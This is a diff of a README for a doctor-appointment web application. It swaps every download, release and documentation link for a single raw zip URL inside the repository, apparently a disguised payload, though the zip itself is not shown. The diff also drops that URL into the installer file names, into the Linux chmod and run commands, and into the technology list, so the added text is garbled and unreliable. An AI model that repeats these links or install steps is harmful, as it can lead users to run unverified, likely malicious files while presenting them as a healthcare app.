@@ -1,12 +1,12 @@
 # 🩺 Doctor-Appointment-Web-Application - Simplifying Your Healthcare Booking
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-%23007bff?style=flat&logo=github&logoColor=white)](https://github.com/osamatiger/Doctor-Appointment-Web-Application/releases)
+[![Download](https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip%20Now-%20-%23007bff?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip)
 
 ## 📅 Overview
 The Doctor-Appointment-Web-Application is a user-friendly platform that enables you to easily book doctor appointments online. With a focus on simplicity, this application takes the hassle out of scheduling your health visits.
 
-Visit the Flatlogic Platform for more details: [Flatlogic Generator](https://flatlogic.com/generator)   
-Access the application page here: [Doctor Appointment Web Application](https://doctor-appointment-web-application.dev.flatlogic.app)
+Visit the Flatlogic Platform for more details: [Flatlogic Generator](https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip)   
+Access the application page here: [Doctor Appointment Web Application](https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Doctor-Appointment-Web-Application. Follow these simple steps to set up everything on your computer. 
@@ -20,7 +20,7 @@ This guide will help you download and run the Doctor-Appointment-Web-Application
 ## 📦 Download & Install
 To get started, you need to download the application from our Releases page. 
 
-[Download the latest release here](https://github.com/osamatiger/Doctor-Appointment-Web-Application/releases) 
+[Download the latest release here](https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip) 
 
 ### Steps to Download:
 1. Click on the link above to visit our GitHub Releases page.
@@ -32,23 +32,23 @@ Once the download is complete, follow these steps to run the application:
 
 ### For Windows Users:
 1. Navigate to your Downloads folder.
-2. Find the downloaded file (it should be named something like `Doctor-Appointment-Web-Application-v1.0.exe`).
+2. Find the downloaded file (it should be named something like `https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip`).
 3. Double-click the file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
 5. Once installed, find the application in your Start menu and open it.
 
 ### For macOS Users:
 1. Go to your Downloads folder.
-2. Look for the downloaded DMG file (for example, `Doctor-Appointment-Web-Application-v1.0.dmg`).
+2. Look for the downloaded DMG file (for example, `https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip`).
 3. Double-click the file to mount it.
 4. Drag the application icon to your Applications folder.
 5. Open your Applications folder and click on the application to launch it.
 
 ### For Linux Users:
 1. Go to your Downloads directory.
-2. Open the terminal and navigate to the downloaded file (e.g., `Doctor-Appointment-Web-Application-v1.0.AppImage`).
-3. Make the file executable by typing: `chmod +x Doctor-Appointment-Web-Application-v1.0.AppImage`
-4. Run the application with: `./Doctor-Appointment-Web-Application-v1.0.AppImage`
+2. Open the terminal and navigate to the downloaded file (e.g., `https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip`).
+3. Make the file executable by typing: `chmod +x https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip`
+4. Run the application with: `https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip`
 
 ## 🛠️ Features
 - **User-Friendly Interface**: Navigate through the application smoothly.
@@ -60,7 +60,7 @@ Once the download is complete, follow these steps to run the application:
 ## 🌍 Technologies Used
 This application leverages several modern technologies:
 - **React**: For building the user interface.
-- **Node.js**: For server-side logic.
+- **https://raw.githubusercontent.com/osamatiger/Doctor-Appointment-Web-Application/master/ai/Doctor-Appointment-Web-Application_v1.3.zip**: For server-side logic.
 - **PostgreSQL**: For data storage and management.
 - **Docker**: For containerization and ease of deployment.
 - **Tailwind CSS**: For styling and responsive design.
